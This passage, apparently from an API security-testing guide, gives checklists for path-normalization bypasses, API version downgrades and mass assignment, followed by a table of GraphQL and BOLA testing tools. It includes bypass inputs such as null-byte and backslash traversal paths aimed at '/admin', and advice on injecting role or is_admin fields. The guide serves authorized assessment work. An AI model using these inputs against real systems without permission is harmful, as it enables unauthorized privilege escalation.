  [ ] Test semicolon path params (/admin;foo=bar)
  [ ] Test backslash (/api\..\admin) -- Windows backends
  [ ] Test null byte (/allowed%00/../admin) -- legacy systems
  [ ] Compare auth decisions across all variants
  [ ] Verify same behavior at gateway AND backend layers
```

### API Version Downgrade Testing Checklist

```
  [ ] Identify current API version from docs/client code
  [ ] Enumerate versions: v0, v1, v2, v3, beta, internal, legacy, staging
  [ ] Compare auth requirements for each version
  [ ] Test each write endpoint across versions
  [ ] Check for AllowAnonymous on sensitive endpoints
  [ ] Test version via URL path, headers, and query params
  [ ] Verify deprecated versions are actually decommissioned
```

### Mass Assignment Testing Checklist

```
  [ ] GET response field analysis for privilege fields
  [ ] Inject role/is_admin/permissions in PUT/PATCH/POST
  [ ] Test nested object injection
  [ ] Test parameter pollution (JSON body + query string)
  [ ] Test batch endpoints for weaker validation
  [ ] Test case variations of field names
  [ ] Verify additionalProperties enforcement
  [ ] Check framework-specific patterns (Rails permit!, Spring @ModelAttribute)
```

### Tool Reference

| Tool | Purpose | Source |
|------|---------|--------|
| cerberauth/proxyaudit | API gateway path normalization testing | github.com/cerberauth/proxyaudit |
| BatchQL | GraphQL batching attacks | github.com/assetnote/batchql |
| InQL | GraphQL introspection/attack automation | github.com/doyensec/inql |
| graphql-cop | GraphQL security audit | github.com/dolevf/graphql-cop |
| Burp Autorize | BOLA/IDOR testing via two-account comparison | BApp Store |
| BOLABuster | LLM-assisted BOLA detection | github.com/paloaltonetworks/BOLABuster |
